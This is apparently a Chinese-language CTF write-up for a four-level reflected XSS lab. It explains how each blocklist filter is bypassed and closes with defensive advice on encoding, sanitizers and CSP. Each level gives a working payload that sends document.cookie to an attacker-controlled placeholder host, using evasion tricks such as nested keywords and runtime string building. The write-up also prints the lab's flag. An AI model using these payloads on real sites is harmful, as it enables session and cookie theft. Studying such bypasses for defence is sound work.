# XSS Lab

## 题目简述

题目由四个连续的反射型 XSS 关卡组成。页面把处理后的输入通过 Jinja 的 `payload|safe` 原样放入 HTML，Selenium Bot 会携带一枚 Cookie 访问攻击者提交的 URL：

- 第一关 Cookie 给出第二关路径；
- 第二关 Cookie 给出第三关路径；
- 第三关 Cookie 给出第四关路径；
- 第四关 Cookie 的值就是 flag。

每一关逐渐增加字符串黑名单，但所有过滤都建立在文本替换上，没有进行上下文相关的 HTML 编码或可靠净化。

## 解题过程

以下 payload 中的 `domain` 代表攻击者控制、能够记录查询参数的接收域名。

### 第一关：无过滤

页面没有处理 payload，直接让 Bot 跳转到接收端并附带 Cookie：

```html
<script>
document.location.replace("http://domain/?c="+document.cookie)
</script>
```

收到的 `xss2` Cookie 值是第二关的隐藏路径。

### 第二关：利用单次非递归替换

过滤器为：

```python
return (
    payload.lower()
    .replace("script", "")
    .replace("img", "")
    .replace("svg", "")
)
```

`replace` 不会对替换结果递归检查。`scrscriptipt` 删除中间的 `script` 后会重新拼成 `script`：

```html
<scrscriptipt>
document.location.replace("http://domain/?c="+document.cookie)
</scrscriptipt>
```

浏览器最终看到合法 `<script>`，外带 `xss3` Cookie。

### 第三关：拆分敏感标识符并使用协议相对 URL

第三关在上述替换前拒绝 `://`、`document` 和 `cookie`。协议相对 URL `//domain/...` 不含 `://`；属性名则在 JavaScript 运行时拼接：

```html
<scrscriptipt>
window["docu"+"ment"].location.replace(
  "//domain/?c="+window["docu"+"ment"]["cook"+"ie"]
)
</scrscriptipt>
```

过滤器扫描原始文本时找不到连续的 `document` 或 `cookie`，但 JavaScript 求值后属性名恢复，Bot 会外带 `xss4` Cookie。

### 第四关：运行时生成全部禁用字符

第四关额外拒绝 `+`、双引号和 `/`：

```python
if any(character in payload for character in '+"/'):
    return "Nope"
```

它仍只对小写的 `script`、`img`、`svg` 各替换一次。最终 payload 为：

```html
<imimgg src=x onerror='javascscriptript:window[`docu`.concat(`ment`)].location.replace(String.fromCharCode(47).concat(String.fromCharCode(47)).concat(`domain`).concat(String.fromCharCode(47)).concat(`?c=`).concat(window[`docu`.concat(`ment`)][`coo`.concat(`kie`)]))' >
```

其各部分作用如下：

- `imimgg` 删除中间的 `img` 后变成 `img`；
- `javascscriptript` 删除中间的 `script` 后变成 `javascript`；
- 反引号字符串和 `.concat()` 代替双引号与 `+`；
- `String.fromCharCode(47)` 在运行时生成 `/`；
- `docu.concat(ment)` 与 `coo.concat(kie)` 在运行时生成敏感属性名。

图片加载失败触发 `onerror`，最终跳转到：

```text
//domain/?c=<第四关 Cookie>
```

接收端得到：

```text
N0PS{cR05s_S1t3_Pr0_5cR1pT1nG}
```

## 方法总结

- 核心技巧：利用非递归字符串删除产生新的危险标签，再用字符串拆分、协议相对 URL和运行时字符生成逐层绕过黑名单。
- 识别信号：HTML 输出使用 `safe`，过滤器只检查字面子串，且替换结果不会重新解析或验证。
- 复用要点：XSS 防御必须根据输出上下文做编码，并使用经过验证的 HTML sanitizer 与 CSP 辅助限制。增加更多关键词和禁用字符只会扩大绕过空间，不能替代结构化解析。
